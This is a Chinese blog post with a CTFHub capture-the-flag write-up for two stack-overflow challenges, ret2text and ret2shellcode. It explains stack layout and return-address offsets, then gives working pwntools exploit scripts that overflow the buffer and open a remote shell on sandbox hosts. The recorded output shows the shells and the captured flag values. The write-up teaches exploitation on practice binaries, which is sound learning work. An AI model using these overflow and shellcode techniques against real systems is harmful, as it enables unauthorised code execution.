---
layout: post
title:  "ctfhub堆栈溢出"
date:   2021-09-14
catalog:  true
tags:
    - pwn 
    - 堆栈溢出
---

# 一. ret2text


## 1.1 题目


是为了获取系统的shell指令


## 1.2 解题

把程序运行`./pwn`:

```
Welcome to CTFHub ret2text.Input someting:
11111111111111111
bye
```


使用Hopper进行反汇编:

![](/images/pwnstack/3035150269184.png)

对应上面的日志就是先打印了`Welcome...`, 再从终端请求输入，在打印`bye`


再看下输入开辟的内存打开：

![](/images/pwnstack/3333834826707.png)

是112，所以只要我们输入字符超过112个就会产生栈溢出；



在一次函数调用中，函数调用栈中将被依次压入：函数实参、返回地址、EBP。如果函数有局部变量，接下来就在栈中开辟相应的空间以构造变量。

![](/images/pwnstack/5913422951550.png)


所以根据上面的堆栈结构，我们需要修改返回地址；

则需要填充栈，即`112个byte + ebp`

 EBP 称为栈基址指针，用来指示当前栈帧的底部。

而我们的返回地址需要修改成多少？一开始说了是为了拿到shell命令，所以查看str为`/bin/sh`在哪调用

![](/images/pwnstack/2012892899954.png)


![](/images/pwnstack/3512821586596.png)

所以我们的修改地址为： `0x04007b8`

代码如下：

```
from pwn import*


#  本地测试
#  io = process("./pwn")
io = remote("challenge-f426b0bd3a230015.sandbox.ctfhub.com", 25812)
shell_addr = 0x04007b8
payload=b'a' * (0x70 + 8) + p64(shell_addr)
io.recvuntil("Welcome to CTFHub ret2text.Input someting:")
io.sendline(payload)
io.interactive()
```

注意这里加8， 因为64位系统是8个字节，32位系统为4个字节；

运行操作结果如下：

```
python3 ret2txt.py
[+] Opening connection to challenge-f426b0bd3a230015.sandbox.ctfhub.com on port 25812: Done
ret2txt.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("Welcome to CTFHub ret2text.Input someting:")
[*] Switching to interactive mode

bye
$ ls
bin
dev
flag
lib
lib32
lib64
pwn
$ cat flag
ctfhub{455641201f706c2c32624438}
```



# 二. ret2shellcode

## 2.1 题目

构造shellcode获取系统shell

## 2.2 解题

![](/images/pwnstack/5120726133074.png)



大小只有16，却可以读0x400


堆栈：16个字节buf再加上ebp的8个字节总共24个字


再看看函数列表：

![](/images/pwnstack/808279947418.png)


没有system函数，所以只能自己去构造可以执行`/bin/sh`的函数，一般都会使用`shellcode`

一般的操作是先发送`shellcode` + `填充码` + `返回地址`， 而这返回地址一般是使用buf地址，即返回后立马去执行`shellcode`；


但目前构造出来的shellcode是48个字节，而我们的堆栈空间只有24个字节，如果还是把`shellcode`放在buf堆栈中则代码会被截断；



所以需要改变一个存放结构`填充码` + `返回地址` + `shellcode`，其中返回地址需要指向`shellcode`；

`shellcode`的地址为`堆栈首地址` + `堆栈大小的偏移` + `返回地址的偏移`


前面说了堆栈空间为24个字节（堆栈大小+ebp），返回地址占用8个字节存储空间，所以`shellcode`地址的为`堆栈首地址` + `32位偏移`


那堆栈地址是多少呢？(堆栈是动态分配的，所以是随机的)，但是代码中已经帮我打印出来了，所以只要获取就好了；

![](/images/pwnstack/740596535800.png)


```
from pwn import*

#  本地测试
#io = process("./pwn")
io = remote("challenge-1575ee6e7e162b62.sandbox.ctfhub.com", 22137)
io.recvuntil('[')
buf_addr = io.recvuntil(']', drop=True)
shell_code = asm(shellcraft.amd64.sh(), arch='amd64')
payload=b'a' * (0x10 + 8) + p64(int(buf_addr,16)+32) + shell_code
io.recvuntil("Input someting :")
io.sendline(payload)
io.interactive()
```

其中先需要把字符串地址通过`int(buf_addr,16)`转换为16进制；

所以其实`p64(int(buf_addr,16)+32)`是指向`shellcode`的首地址的；

测试结果如下

```
➜  pwn python3 ret2shellcode.py
[+] Opening connection to challenge-1575ee6e7e162b62.sandbox.ctfhub.com on port 22137: Done
ret2shellcode.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil('[')
ret2shellcode.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  buf_addr = io.recvuntil(']', drop=True)
b'0x7ffc5fec08e0'
ret2shellcode.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("Input someting :")
[*] Switching to interactive mode
 
$ ls
bin
dev
flag
lib
lib32
lib64
pwn
$ cat flag
ctfhub{5685d744460e087734c0c246}

```